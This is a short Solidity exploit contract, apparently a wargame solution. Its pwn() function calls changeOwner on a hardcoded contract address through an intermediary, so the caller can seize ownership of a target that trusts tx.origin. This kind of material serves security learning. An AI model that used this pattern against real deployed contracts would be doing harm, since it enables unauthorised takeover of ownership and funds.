// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {
    function pwn() public {
        ITelephone(0x6a700f91E48aac17B45f478fF87C69659DD2C8a6).changeOwner(msg.sender);
    }
}
